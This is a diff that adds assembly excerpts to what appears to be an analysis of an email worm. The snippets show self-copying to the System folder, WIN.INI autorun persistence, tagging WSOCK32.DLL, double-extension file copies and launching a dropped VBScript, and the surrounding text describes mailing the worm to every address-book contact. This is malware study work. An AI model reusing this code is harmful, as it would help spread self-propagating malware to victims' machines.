@@ -77,6 +77,91 @@ User‑visible text:
 Network/Email:
 - Sends email via Outlook OOM to all address book entries; subject “Xtra game for you”; attachment `Services.exe` from System folder. No raw SMTP beacons.
 
+## Source code excerpts (from XFW.asm)
+
+Short, real snippets below illustrate key behaviors. They are inert and trimmed to keep context clear.
+
+### Copy to %System%\Services.exe
+
+```asm
+; Build %System%\Services.exe and copy self
+push  50h
+push  offset szCopie
+callx GetSystemDirectoryA
+@pushsz "\SERVICES.EXE"
+push  offset szCopie
+callx lstrcat
+push  00h
+push  offset szCopie
+push  offset szOrig
+callx CopyFileA
+```
+
+### WIN.INI autorun (Win9x/ME)
+
+```asm
+; Write [windows] run=<Services.exe> into %WinDir%\WIN.INI
+push  50
+push  offset Winini
+callx GetWindowsDirectoryA
+@pushsz "\\WIN.INI"
+push  offset Winini
+callx lstrcat
+push  offset Winini
+push  offset szCopie
+@pushsz "run"
+@pushsz "windows"
+callx WritePrivateProfileStringA
+```
+
+### WSOCK32.DLL marker write
+
+```asm
+; Map Wsock32.dll and write signature bytes "PetiK" into DOS header
+mov   esi, eax          ; esi = mapped view base
+cmp   byte ptr [esi+12h], 'P'
+je    FIN3              ; already tagged
+mov   word ptr [esi+12h], 'eP'
+mov   word ptr [esi+14h], 'it'
+mov   byte ptr [esi+16h], 'K'
+```
+
+### Double-extension copy for *.dll -> *.dll.exe
+
+```asm
+; Append ".EXE" after DLL name and copy worm as file.dll.exe
+mov   edi, offset Search.cFileName
+push  edi
+callx lstrlen
+add   edi, eax
+mov   eax, 'EXE.'
+stosd
+xor   eax, eax
+stosd
+push  01h
+push  offset Search.cFileName
+push  offset szOrig
+callx CopyFileA
+```
+
+### Drop and launch Outlook VBScript
+
+```asm
+; Create C:\Win.vbs, write embedded script, then launch via wscript
+push  00h
+push  80h
+push  02h
+push  00h
+push  01h
+push  40000000h
+@pushsz "C:\\Win.vbs"
+callx CreateFileA
+; ... WriteFile of vbsd (omitted here for brevity) ...
+push  01h
+@pushsz "wscript C:\\Win.vbs"
+callx WinExec
+```
+
 ## Code quirks and engineering notes
 
 - The header comment claims a “Run Services” registry value, but the provided code does not write one; persistence relies on `WIN.INI` only.
